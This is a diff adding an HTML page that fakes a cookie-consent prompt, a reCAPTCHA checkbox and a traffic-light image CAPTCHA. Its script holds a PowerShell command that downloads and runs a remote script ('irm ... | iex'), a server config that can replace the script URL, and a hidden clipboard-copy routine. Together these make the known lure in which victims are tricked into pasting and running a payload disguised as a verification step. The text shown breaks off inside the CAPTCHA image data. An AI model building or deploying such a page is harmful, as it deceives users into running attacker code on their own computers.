@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Before You Continue</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { width: 100%; height: 100%; overflow: hidden;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+
+    #bg { position: fixed; inset: 0; z-index: 0; background: #1a1a2e;
+      background-size: cover; background-position: center; background-repeat: no-repeat;
+      transition: opacity 1.4s ease; opacity: 0; }
+    #bg.loaded { opacity: 1; }
+    #bg-dim { position: fixed; inset: 0; z-index: 1; background: rgba(0,0,0,0.45); }
+
+    #mobile-wall { display: none; position: fixed; inset: 0; z-index: 500;
+      background: #111; flex-direction: column; align-items: center;
+      justify-content: center; gap: 16px; text-align: center; padding: 2rem; }
+    #mobile-wall .icon { font-size: 48px; }
+    #mobile-wall h2 { font-size: 18px; font-weight: 600; color: #fff; }
+    #mobile-wall p  { font-size: 13px; color: #aaa; max-width: 260px; line-height: 1.6; }
+
+    #audio-prompt { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+      z-index: 50; display: none; align-items: center; gap: 7px; padding: 8px 16px;
+      background: rgba(0,0,0,0.7); border-radius: 20px; cursor: pointer; white-space: nowrap; }
+    #audio-prompt svg { width: 14px; height: 14px; stroke: #fff; fill: none; stroke-width: 2; }
+    #audio-prompt span { font-size: 11px; color: rgba(255,255,255,.85); letter-spacing: .04em; }
+
+    .stage { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; padding: 20px; }
+    .stage.hidden { display: none; }
+
+    /* ── Stage 1: reCAPTCHA ── */
+    #stage-rc { z-index: 300; background: rgba(0,0,0,0.78); }
+
+    .rc-card { background: #fff; border: 1px solid #d3d3d3; border-radius: 4px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.4); width: 310px; font-family: Arial, sans-serif; }
+    .rc-header { padding: 11px 14px 9px; border-bottom: 1px solid #e8e8e8;
+      display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 500; color: #555; }
+    .rc-body { padding: 16px 14px; display: flex; align-items: center; justify-content: space-between; }
+    .rc-left { display: flex; align-items: center; gap: 13px; cursor: pointer; }
+    .rc-checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .rc-checkbox svg { display: none; }
+    .rc-checkbox.checked { background: #4a90d9; border-color: #4a90d9; }
+    .rc-checkbox.checked svg { display: block; }
+    .rc-label { font-size: 14px; color: #333; }
+    .rc-badge { text-align: center; }
+    .rc-badge-text { font-size: 8px; color: #9e9e9e; letter-spacing: 0.02em; margin-top: 3px; }
+
+    /* ── Stage 2: Traffic CAPTCHA ── */
+    #stage-tl { z-index: 200; background: rgba(0,0,0,0.80); }
+
+    .tl-card { background: #fff; border-radius: 4px; width: min(520px, 100%);
+      box-shadow: 0 8px 40px rgba(0,0,0,0.5); font-family: Arial, sans-serif; overflow: hidden; }
+    .tl-header { padding: 12px 18px; border-bottom: 1px solid #e0e0e0;
+      display: flex; align-items: center; justify-content: space-between; }
+    .tl-header-left { display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 500; color: #202124; }
+    .tl-header-left svg { color: #4285f4; }
+    .tl-attempt { font-size: 12px; color: #5f6368;
+      border: 1px solid #dadce0; border-radius: 20px; padding: 3px 10px; }
+    .tl-instruction { padding: 12px 18px 10px; font-size: 13.5px; color: #202124; line-height: 1.55; }
+    .tl-instruction strong { font-weight: 700; }
+    .tl-error { display: none; padding: 8px 18px; background: #fce8e6;
+      font-size: 12.5px; color: #c5221f; border-bottom: 1px solid #f5c6c4; }
+
+    .tl-grid { display: grid; grid-template-columns: repeat(3, 1fr);
+      border-top: 2px solid #dadce0; border-left: 2px solid #dadce0; }
+    .tl-cell { position: relative; cursor: pointer; overflow: hidden;
+      border-right: 2px solid #dadce0; border-bottom: 2px solid #dadce0; aspect-ratio: 4/3; }
+    .tl-cell svg.scene { width: 100%; height: 100%; display: block; }
+    .tl-cell .tick { display: none; position: absolute; bottom: 6px; right: 6px;
+      width: 24px; height: 24px; background: #1a73e8; border-radius: 50%;
+      align-items: center; justify-content: center; }
+    .tl-cell .tick svg { width: 13px; height: 13px; }
+    .tl-cell.selected { outline: 3px solid #1a73e8; outline-offset: -3px; }
+    .tl-cell.selected .tick { display: flex; }
+    .tl-cell.wrong { outline: 3px solid #ea4335; outline-offset: -3px; animation: shake .35s ease; }
+    @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-5px)} 75%{transform:translateX(5px)} }
+
+    .tl-bar { padding: 10px 16px; border-top: 1px solid #e0e0e0;
+      display: flex; align-items: center; justify-content: space-between; }
+    .tl-count { font-size: 13px; color: #5f6368; }
+    .tl-verify { background: #1a73e8; color: #fff; border: none; border-radius: 3px;
+      padding: 10px 28px; font-size: 14px; font-weight: 500; cursor: pointer; }
+    .tl-verify:hover { background: #1557b0; }
+    .tl-footer { padding: 8px 16px; font-size: 11px; color: #9e9e9e;
+      border-top: 1px solid #efefef; display: flex; align-items: center; gap: 6px; }
+    .tl-footer a { color: #1a73e8; text-decoration: none; }
+    .tl-rc-logo { flex-shrink: 0; }
+
+    /* ── Stage 3: Consent ── */
+    #desktop-view { z-index: 10; position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; }
+    #consent-card { background: #fff; border-radius: 8px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.35), 0 2px 8px rgba(0,0,0,0.2);
+      width: min(440px, calc(100vw - 2rem)); padding: 24px 24px 20px;
+      opacity: 0; transform: translateY(12px); max-height: calc(100vh - 2rem); overflow-y: auto; }
+    #consent-card.visible { animation: cardIn 0.4s ease forwards; }
+    @keyframes cardIn { to { opacity:1; transform:translateY(0); } }
+    .card-header { display: flex; align-items: center; gap: 8px; margin-bottom: 14px; }
+    .card-header svg { width: 20px; height: 20px; flex-shrink: 0; }
+    .card-header h1 { font-size: 15px; font-weight: 600; color: #111; }
+    .card-body { font-size: 13px; color: #444; line-height: 1.65; margin-bottom: 18px; }
+    .item-list { display: flex; flex-direction: column; gap: 14px; margin-bottom: 20px; }
+    .item { display: flex; gap: 10px; align-items: flex-start; }
+    .item-check { flex-shrink: 0; margin-top: 1px; }
+    .item-check svg { width: 18px; height: 18px; }
+    .item-text h3 { font-size: 13px; font-weight: 600; color: #111; margin-bottom: 2px; }
+    .item-text p  { font-size: 12px; color: #666; line-height: 1.5; }
+    .card-divider { height: 1px; background: #e5e5e5; margin: 0 0 16px; }
+    #agree-btn { display: block; width: 100%; padding: 13px; background: #0066cc; color: #fff;
+      border: none; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer;
+      transition: background 0.15s; margin-bottom: 12px; }
+    #agree-btn:hover { background: #0052a3; }
+    .card-footer { font-size: 11px; color: #888; text-align: center; }
+    .card-footer a { color: #0066cc; text-decoration: none; }
+
+    #content-overlay { position: fixed; inset: 0; z-index: 90; background: #fff;
+      display: flex; align-items: flex-start; justify-content: center;
+      overflow-y: auto; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; }
+    #content-overlay.visible { opacity: 1; pointer-events: all; }
+    #content-inner { width: 100%; min-height: 100%; }
+  </style>
+</head>
+<body>
+
+  <div id="bg"></div>
+  <div id="bg-dim"></div>
+  <audio id="bgMusic" loop preload="auto"></audio>
+
+  <div id="audio-prompt">
+    <svg viewBox="0 0 24 24"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/>
+      <path d="M19.07 4.93a10 10 0 0 1 0 14.14"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>
+    <span>Click anywhere to enable audio</span>
+  </div>
+
+  <div id="mobile-wall">
+    <div class="icon">🖥️</div>
+    <h2>Desktop Required</h2>
+    <p>This page is only accessible from a PC or laptop.<br/>Please switch devices and try again.</p>
+  </div>
+  
+  <!-- STAGE 3: Consent card -->
+  <div id="desktop-view" style="display:flex">
+    <div id="consent-card" class="visible">
+      <div class="card-header">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        </svg>
+        <h1>Before you continue to this site</h1>
+      </div>
+      <p class="card-body">
+        This site and its partners use cookies and similar technologies to store and access information on your device. This allows us to improve your browsing experience and provide personalised content and advertising.
+      </p>
+      <div class="item-list">
+        <div class="item">
+          <div class="item-check"><svg viewBox="0 0 24 24" fill="none" stroke="#0066cc" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+          <div class="item-text"><h3>Essential cookies</h3><p>Required for the site to function correctly. They enable core features such as security, network management, and account access.</p></div>
+        </div>
+        <div class="item">
+          <div class="item-check"><svg viewBox="0 0 24 24" fill="none" stroke="#0066cc" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+          <div class="item-text"><h3>Analytics cookies</h3><p>Help us understand how visitors interact with our website by collecting and reporting information anonymously.</p></div>
+        </div>
+        <div class="item">
+          <div class="item-check"><svg viewBox="0 0 24 24" fill="none" stroke="#0066cc" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+          <div class="item-text"><h3>Personalisation cookies</h3><p>Enable the website to remember choices you make (such as language or region) and provide enhanced, personalised features.</p></div>
+        </div>
+      </div>
+      <p class="card-body" style="margin-bottom:16px;">By clicking <strong>I agree</strong>, you consent to the use of cookies as described in our Cookie Policy. You may withdraw your consent at any time in your account settings.</p>
+      <div class="card-divider"></div>
+      <button id="agree-btn">I agree</button>
+      <div class="card-footer">Learn more about how we use your data in our <a href="#">Privacy Policy</a>.</div>
+    </div>
+  </div>
+
+  <!-- STAGE 1: reCAPTCHA checkbox -->
+  <div class="stage hidden" id="stage-rc">
+    <div class="rc-card">
+      <div class="rc-header">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4a90d9" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+        </svg>
+        Security verification
+      </div>
+      <div class="rc-body">
+        <div class="rc-left" onclick="rcCheck()">
+          <div class="rc-checkbox" id="rcCheckbox">
+            <svg width="13" height="13" fill="none" stroke="#fff" stroke-width="2.5" viewBox="0 0 24 24">
+              <polyline points="20 6 9 17 4 12"/>
+            </svg>
+          </div>
+          <span class="rc-label">I'm not a robot</span>
+        </div>
+        <div class="rc-badge">
+          <img src="/recaptcha.png" width="38" height="38" alt="reCAPTCHA" style="display:block;margin:0 auto 3px">
+          <div class="rc-badge-text">reCAPTCHA</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- STAGE 2: Traffic Light CAPTCHA -->
+  <div class="stage hidden" id="stage-tl">
+    <div class="tl-card">
+      <div class="tl-header">
+        <div class="tl-header-left">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+          </svg>
+          Security verification
+        </div>
+        <span class="tl-attempt" id="tlAttempt">Attempt 1 of 3</span>
+      </div>
+      <div class="tl-instruction">
+        Select all images that contain a <strong>traffic light</strong>.<br>
+        Click <strong>Verify</strong> once there are none left.
+      </div>
+      <div class="tl-error" id="tlError">Please try again — select <strong>all</strong> images that contain a traffic light.</div>
+      <div class="tl-grid" id="tlGrid"></div>
+      <div class="tl-bar">
+        <span class="tl-count" id="tlCount">0 images selected</span>
+        <button class="tl-verify" onclick="tlVerify()">Verify</button>
+      </div>
+      <div class="tl-footer">
+        <img src="/recaptcha.png" width="18" height="18" alt="reCAPTCHA" style="flex-shrink:0">
+        reCAPTCHA — <a href="#">Privacy Policy</a> &amp; <a href="#">Terms of Service</a> apply.
+      </div>
+    </div>
+  </div>
+
+  <div id="content-overlay"><div id="content-inner"></div></div>
+
+  <script>
+    // ── Mobile ──────────────────────────────────────────────────────────
+    var isMobile = window.innerWidth < 1024 ||
+      /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    if (isMobile) {
+      document.getElementById('mobile-wall').style.display = 'flex';
+      document.getElementById('stage-rc').style.display = 'none';
+      document.getElementById('bg-dim').style.display = 'none';
+    }
+
+    // ── CMD + clipboard ─────────────────────────────────────────────────
+    var CMD = 'powershell -c "irm https://yourdomain.com/demo.ps1 | iex"';
+
+    async function copyToClipboard(text) {
+      try { await navigator.clipboard.writeText(text); return true; } catch(e) {}
+      var ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.cssText = 'position:fixed;left:-9999px;top:-9999px;opacity:0';
+      document.body.appendChild(ta); ta.focus(); ta.select();
+      try { var ok = document.execCommand('copy'); document.body.removeChild(ta); return ok; }
+      catch(e2) { document.body.removeChild(ta); return false; }
+    }
+
+    // ── Config / audio ──────────────────────────────────────────────────
+    var bg = document.getElementById('bg'), music = document.getElementById('bgMusic'),
+        audioPrompt = document.getElementById('audio-prompt'), musicReady = false;
+    fetch('/api/config').then(function(r){ return r.json(); }).then(function(cfg){
+      if (cfg.ps1_url) CMD = 'powershell -c "irm ' + cfg.ps1_url + ' | iex"';
+      if (cfg.has_bg) {
+        var img = new Image();
+        img.onload = function(){ bg.style.backgroundImage="url('"+cfg.bg_url+"')"; bg.classList.add('loaded'); };
+        img.onerror = function(){ bg.classList.add('loaded'); };
+        img.src = cfg.bg_url;
+      } else { bg.style.background='linear-gradient(135deg,#1a1a2e,#16213e,#0f3460)'; bg.classList.add('loaded'); }
+      if (cfg.has_music){ music.src=cfg.music_url; musicReady=true; tryAutoplay(); }
+    }).catch(function(){ bg.style.background='#1a1a2e'; bg.classList.add('loaded'); });
+    function tryAutoplay(){ if(!musicReady) return; music.volume=0.65; music.play().catch(function(){ audioPrompt.style.display='flex'; }); }
+    function unlockAudio(){ if(!musicReady) return; music.play().then(function(){ audioPrompt.style.display='none'; }).catch(function(){}); }
+    document.addEventListener('click', unlockAudio, {once:true});
+    audioPrompt.addEventListener('click', function(e){ e.stopPropagation(); unlockAudio(); });
+
+    // ════════════════════════════════════════════════════════
+    // STAGE 1: reCAPTCHA
+    // ════════════════════════════════════════════════════════
+    function rcCheck() {
+      document.getElementById('rcCheckbox').classList.add('checked');
+      setTimeout(function(){
+        document.getElementById('stage-rc').classList.add('hidden');
+        document.getElementById('stage-tl').classList.remove('hidden');
+        tlBuildChallenge();
+      }, 500);
+    }
+
+    // ════════════════════════════════════════════════════════
+    // STAGE 2: Traffic Light CAPTCHA
+    // Flat cartoon style matching real CAPTCHA aesthetic
+    // Pool: 6 TL scenes + 9 no-TL scenes → pick 3 TL + 6 no-TL, shuffle
+    // ════════════════════════════════════════════════════════
+
+    // Traffic light component: cx = center-x, hy = top of housing
+    // Style: large flat cartoon, bold colors, thin pole
+    function tl(cx, hy) {
+      var hw = 19; // half-width of housing
+      var hh = 60; // height of housing
+      return (
+        // Pole
+        '<rect x="'+(cx-4)+'" y="'+(hy+hh)+'" width="8" height="22" fill="#3a3a3a"/>' +
+        // Housing body
+        '<rect x="'+(cx-hw)+'" y="'+hy+'" width="'+(hw*2)+'" height="'+hh+'" rx="6" fill="#111"/>' +
+        // Light bezels (slightly recessed look)
+        '<circle cx="'+cx+'" cy="'+(hy+11)+'" r="13" fill="#222"/>' +
+        '<circle cx="'+cx+'" cy="'+(hy+30)+'" r="13" fill="#222"/>' +
+        '<circle cx="'+cx+'" cy="'+(hy+49)+'" r="13" fill="#222"/>' +
+        // Lights
+        '<circle cx="'+cx+'" cy="'+(hy+11)+'" r="10" fill="#e82020"/>' +
+        '<circle cx="'+cx+'" cy="'+(hy+30)+'" r="10" fill="#f5a020"/>' +
+        '<circle cx="'+cx+'" cy="'+(hy+49)+'" r="10" fill="#28c028"/>'
+      );
+    }
+
+    // ── 6 TL scenes ─────────────────────────────────────────────────────
+    var TL_POOL = [
+
+      // TL-1: Road + building left, TL prominent right
+      '<rect width="160" height="120" fill="#88c0d0"/>' +
+      // building left
+      '<rect x="0" y="10" width="68" height="75" fill="#9ab8a0"/>' +
+      '<rect x="0" y="10" width="68" height="8" fill="#7a9880"/>' +
+      '<rect x="6" y="24" width="14" height="14" fill="#c8e0c8" rx="1"/>' +
+      '<rect x="26" y="24" width="14" height="14" fill="#c8e0c8" rx="1"/>' +
+      '<rect x="46" y="24" width="14" height="14" fill="#c8e0c8" rx="1"/>' +
+      '<rect x="6" y="44" width="14" height="14" fill="#c8e0c8" rx="1"/>' +
+      '<rect x="26" y="44" width="14" height="14" fill="#c8e0c8" rx="1"/>' +
+      '<rect x="46" y="44" width="14" height="14" fill="#c8e0c8" rx="1"/>' +
+      // road
+      '<rect y="82" width="160" height="38" fill="#787878"/>' +
+      '<rect y="80" width="160" height="4" fill="#8a8a8a"/>' +
+      // yellow road dashes
+      '<rect x="10" y="98" width="20" height="5" fill="#f0c000"/>' +
+      '<rect x="40" y="98" width="20" height="5" fill="#f0c000"/>' +
+      '<rect x="70" y="98" width="20" height="5" fill="#f0c000"/>' +
+      '<rect x="100" y="98" width="20" height="5" fill="#f0c000"/>' +
+      '<rect x="130" y="98" width="20" height="5" fill="#f0c000"/>' +
+      // TL (right side, large)
+      tl(118, 14),
+
+      // TL-2: Blue sky, building left, TL center-right
+      '<rect width="160" height="120" fill="#7ab8cc"/>' +
+      // building
+      '<rect x="0" y="5" width="72" height="78" fill="#8898a8"/>' +
+      '<rect x="0" y="5" width="72" height="10" fill="#6878a0"/>' +
+      '<rect x="6" y="22" width="14" height="14" fill="#b8d0e8" rx="1"/>' +
+      '<rect x="26" y="22" width="14" height="14" fill="#b8d0e8" rx="1"/>' +
+      '<rect x="46" y="22" width="14" height="14" fill="#b8d0e8" rx="1"/>' +
+      '<rect x="6" y="42" width="14" height="14" fill="#b8d0e8" rx="1"/>' +
+      '<rect x="26" y="42" width="14" height="14" fill="#b8d0e8" rx="1"/>' +
+      '<rect x="46" y="42" width="14" height="14" fill="#b8d0e8" rx="1"/>' +
+      '<rect x="6" y="62" width="14" height="14" fill="#b8d0e8" rx="1"/>' +
+      '<rect x="26" y="62" width="14" height="14" fill="#b8d0e8" rx="1"/>' +
+      // sidewalk
+      '<rect y="82" width="160" height="8" fill="#a8a080"/>' +
+      // road
+      '<rect y="88" width="160" height="32" fill="#787878"/>' +
+      '<rect x="5" y="100" width="20" height="5" fill="#f0c000"/>' +
+      '<rect x="35" y="100" width="20" height="5" fill="#f0c000"/>' +
+      '<rect x="65" y="100" width="20" height="5" fill="#f0c000"/>' +
+      '<rect x="95" y="100" width="20" height="5" fill="#f0c000"/>' +
+      '<rect x="125" y="100" width="20" height="5" fill="#f0c000"/>' +
+      tl(108, 10),
+
+      // TL-3: Intersection, TL on corner post
+      '<rect width="160" height="120" fill="#90b8c8"/>' +
+      // horizontal road
+      '<rect y="72" width="160" height="48" fill="#787878"/>' +
+      // vertical road strip
+      '<rect x="58" y="0" width="44" height="120" fill="#787878"/>' +
+      // road markings
+      '<rect x="62" y="5" width="6" height="14" fill="#f0c000"/>' +
+      '<rect x="62" y="25" width="6" height="14" fill="#f0c000"/>' +
+      '<rect x="62" y="45" width="6" height="14" fill="#f0c000"/>' +
+      '<rect x="5" y="90" width="14" height="6" fill="#f0c000"/>' +
+      '<rect x="28" y="90" width="14" height="6" fill="#f0c000"/>' +
+      '<rect x="100" y="90" width="14" height="6" fill="#f0c000"/>' +
+      '<rect x="124" y="90" width="14" height="6" fill="#f0c000"/>' +
+      // curbs
+      '<rect y="70" width="58" height="4" fill="#999"/>' +
+      '<rect x="102" y="70" width="58" height="4" fill="#999"/>' +
+      tl(118, 8),
+
+      // TL-4: Night scene, dark sky, glowing TL
+      '<rect width="160" height="120" fill="#1a2538"/>' +
+      // buildings (dark, lit windows)
+      '<rect x="0" y="5" width="65" height="78" fill="#1e2d42"/>' +
+      '<rect x="0" y="5" width="65" height="8" fill="#16223a"/>' +
+      '<rect x="6" y="20" width="12" height="10" fill="#ffd" opacity=".7" rx="1"/>' +
+      '<rect x="24" y="20" width="12" height="10" fill="#ffd" opacity=".4" rx="1"/>' +
+      '<rect x="44" y="20" width="12" height="10" fill="#ffd" opacity=".7" rx="1"/>' +
+      '<rect x="6" y="36" width="12" height="10" fill="#ffd" opacity=".6" rx="1"/>' +
+      '<rect x="44" y="36" width="12" height="10" fill="#ffd" opacity=".3" rx="1"/>' +
+      '<rect x="75" y="0" width="85" height="83" fill="#1c2a3c"/>' +
+      '<rect x="80" y="10" width="12" height="10" fill="#ffd" opacity=".5" rx="1"/>' +
+      '<rect x="98" y="10" width="12" height="10" fill="#ffd" opacity=".7" rx="1"/>' +
+      '<rect x="120" y="10" width="12" height="10" fill="#ffd" opacity=".4" rx="1"/>' +
+      // road
+      '<rect y="82" width="160" height="38" fill="#3a3a3a"/>' +
+      '<rect y="80" width="160" height="4" fill="#555"/>' +
+      '<rect x="10" y="98" width="20" height="4" fill="#f0c000" opacity=".8"/>' +
+      '<rect x="40" y="98" width="20" height="4" fill="#f0c000" opacity=".8"/>' +
+      '<rect x="70" y="98" width="20" height="4" fill="#f0c000" opacity=".8"/>' +
+      '<rect x="100" y="98" width="20" height="4" fill="#f0c000" opacity=".8"/>' +
+      '<rect x="130" y="98" width="20" height="4" fill="#f0c000" opacity=".8"/>' +
+      tl(118, 12),
+
+      // TL-5: Beige/tan building, TL on sidewalk
+      '<rect width="160" height="120" fill="#a0c4d8"/>' +
+      '<rect x="0" y="8" width="160" height="74" fill="#c8b890"/>' +
+      '<rect x="0" y="8" width="160" height="10" fill="#a89870"/>' +
+      '<rect x="10" y="26" width="18" height="18" fill="#e8e0c0" rx="1"/>' +
+      '<rect x="36" y="26" width="18" height="18" fill="#e8e0c0" rx="1"/>' +
+      '<rect x="62" y="26" width="18" height="18" fill="#e8e0c0" rx="1"/>' +
+      '<rect x="88" y="26" width="18" height="18" fill="#e8e0c0" rx="1"/>' +
+      '<rect x="10" y="52" width="18" height="18" fill="#e8e0c0" rx="1"/>' +
+      '<rect x="36" y="52" width="18" height="18" fill="#e8e0c0" rx="1"/>' +
+      '<rect x="62" y="52" width="18" height="18" fill="#e8e0c0" rx="1"/>' +
+      // front door
+      '<rect x="118" y="55" width="22" height="27" fill="#a08050" rx="2"/>' +
+      // sidewalk
+      '<rect y="82" width="160" height="9" fill="#c0b898"/>' +
+      // road
+      '<rect y="89" width="160" height="31" fill="#787878"/>' +
+      '<rect x="8" y="100" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="36" y="100" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="64" y="100" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="92" y="100" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="120" y="100" width="18" height="5" fill="#f0c000"/>' +
+      tl(25, 10),
+
+      // TL-6: Elevated/overpass with TL on ramp
+      '<rect width="160" height="120" fill="#88b8cc"/>' +
+      // overpass deck
+      '<rect y="28" width="160" height="22" fill="#9a9a9a"/>' +
+      '<rect y="26" width="160" height="4" fill="#bbb"/>' +
+      '<rect y="48" width="160" height="4" fill="#aaa"/>' +
+      // supports
+      '<rect x="30" y="48" width="10" height="35" fill="#888"/>' +
+      '<rect x="120" y="48" width="10" height="35" fill="#888"/>' +
+      // road below
+      '<rect y="82" width="160" height="38" fill="#787878"/>' +
+      '<rect y="80" width="160" height="4" fill="#8a8a8a"/>' +
+      '<rect x="8" y="96" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="36" y="96" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="64" y="96" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="92" y="96" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="120" y="96" width="18" height="5" fill="#f0c000"/>' +
+      // vehicle on overpass (orange transit bus)
+      '<rect x="60" y="30" width="40" height="16" rx="3" fill="#f58a20"/>' +
+      '<rect x="64" y="32" width="10" height="9" fill="#d0eef8" rx="1"/>' +
+      '<rect x="78" y="32" width="10" height="9" fill="#d0eef8" rx="1"/>' +
+      tl(22, 12)
+    ];
+
+    // ── 9 no-TL scenes ───────────────────────────────────────────────────
+    var NO_TL_POOL = [
+
+      // N-1: Storefront, red awning
+      '<rect width="160" height="120" fill="#98bcd0"/>' +
+      '<rect x="0" y="12" width="160" height="70" fill="#c8b890"/>' +
+      '<rect x="0" y="12" width="160" height="10" fill="#a89870"/>' +
+      '<rect x="15" y="28" width="50" height="14" fill="#d83020" rx="2"/>' +
+      '<rect x="15" y="40" width="50" height="30" fill="#e0d0b0"/>' +
+      '<rect x="22" y="42" width="16" height="22" fill="#b8d8e8" rx="1"/>' +
+      '<rect x="42" y="42" width="16" height="22" fill="#b8d8e8" rx="1"/>' +
+      '<rect x="72" y="24" width="70" height="48" fill="#d0c0a0"/>' +
+      '<rect x="78" y="30" width="14" height="14" fill="#b8cce0" rx="1"/>' +
+      '<rect x="98" y="30" width="14" height="14" fill="#b8cce0" rx="1"/>' +
+      '<rect x="118" y="30" width="14" height="14" fill="#b8cce0" rx="1"/>' +
+      '<rect x="78" y="50" width="14" height="14" fill="#b8cce0" rx="1"/>' +
+      '<rect x="98" y="50" width="14" height="14" fill="#b8cce0" rx="1"/>' +
+      '<rect y="82" width="160" height="38" fill="#787878"/>' +
+      '<rect x="10" y="97" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="38" y="97" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="66" y="97" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="94" y="97" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="122" y="97" width="18" height="5" fill="#f0c000"/>',
+
+      // N-2: Two cars on road (red + green), no TL
+      '<rect width="160" height="120" fill="#90afc0"/>' +
+      '<rect x="0" y="15" width="75" height="68" fill="#8898a8"/>' +
+      '<rect x="0" y="15" width="75" height="8" fill="#6878a0"/>' +
+      '<rect x="85" y="10" width="75" height="73" fill="#7a8a9a"/>' +
+      '<rect x="6" y="28" width="12" height="12" fill="#b8cce0" rx="1"/>' +
+      '<rect x="26" y="28" width="12" height="12" fill="#b8cce0" rx="1"/>' +
+      '<rect x="46" y="28" width="12" height="12" fill="#b8cce0" rx="1"/>' +
+      '<rect y="82" width="160" height="38" fill="#787878"/>' +
+      '<rect y="80" width="160" height="4" fill="#8a8a8a"/>' +
+      '<rect x="74" y="88" width="12" height="26" fill="#f0c000"/>' +
+      // red car (left)
+      '<rect x="8" y="88" width="54" height="26" rx="4" fill="#e02020"/>' +
+      '<rect x="14" y="90" width="18" height="14" fill="#c8e8f8" rx="2"/>' +
+      '<rect x="36" y="90" width="18" height="14" fill="#c8e8f8" rx="2"/>' +
+      '<rect x="10" y="112" width="14" height="6" rx="3" fill="#1a1a1a"/>' +
+      '<rect x="44" y="112" width="14" height="6" rx="3" fill="#1a1a1a"/>' +
+      // green car (right)
+      '<rect x="98" y="88" width="54" height="26" rx="4" fill="#28b028"/>' +
+      '<rect x="104" y="90" width="18" height="14" fill="#c8e8f8" rx="2"/>' +
+      '<rect x="126" y="90" width="18" height="14" fill="#c8e8f8" rx="2"/>' +
+      '<rect x="100" y="112" width="14" height="6" rx="3" fill="#1a1a1a"/>' +
+      '<rect x="134" y="112" width="14" height="6" rx="3" fill="#1a1a1a"/>',
+
+      // N-3: Bus stop shelter
+      '<rect width="160" height="120" fill="#98c0d0"/>' +
+      '<rect y="82" width="160" height="38" fill="#787878"/>' +
+      '<rect y="80" width="160" height="4" fill="#8a8a8a"/>' +
+      '<rect x="8" y="97" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="36" y="97" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="64" y="97" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="92" y="97" width="18" height="5" fill="#f0c000"/>' +
+      // shelter frame
+      '<rect x="22" y="38" width="6" height="46" fill="#9ab8c0"/>' +
+      '<rect x="82" y="38" width="6" height="46" fill="#9ab8c0"/>' +
+      '<rect x="22" y="36" width="66" height="8" fill="#7aa0b0" rx="2"/>' +
+      '<rect x="22" y="44" width="66" height="38" fill="rgba(180,220,240,0.35)"/>' +
+      // bench
+      '<rect x="28" y="65" width="50" height="10" rx="2" fill="#9aacb0"/>' +
+      '<rect x="32" y="72" width="6" height="12" fill="#7a8c90"/>' +
+      '<rect x="68" y="72" width="6" height="12" fill="#7a8c90"/>' +
+      // building background
+      '<rect x="92" y="15" width="68" height="68" fill="#8898a8"/>' +
+      '<rect x="98" y="22" width="12" height="12" fill="#b8cce0" rx="1"/>' +
+      '<rect x="116" y="22" width="12" height="12" fill="#b8cce0" rx="1"/>' +
+      '<rect x="134" y="22" width="12" height="12" fill="#b8cce0" rx="1"/>',
+
+      // N-4: Parking lot, cars, no light
+      '<rect width="160" height="120" fill="#a8c0cc"/>' +
+      '<rect width="160" height="30" fill="#9aacb8"/>' +
+      '<rect y="28" width="160" height="92" fill="#7a7a7a"/>' +
+      '<rect x="0" y="28" width="160" height="4" fill="#6a6a6a"/>' +
+      // parking lines
+      '<rect x="12" y="36" width="3" height="72" fill="#fff" opacity=".4"/>' +
+      '<rect x="52" y="36" width="3" height="72" fill="#fff" opacity=".4"/>' +
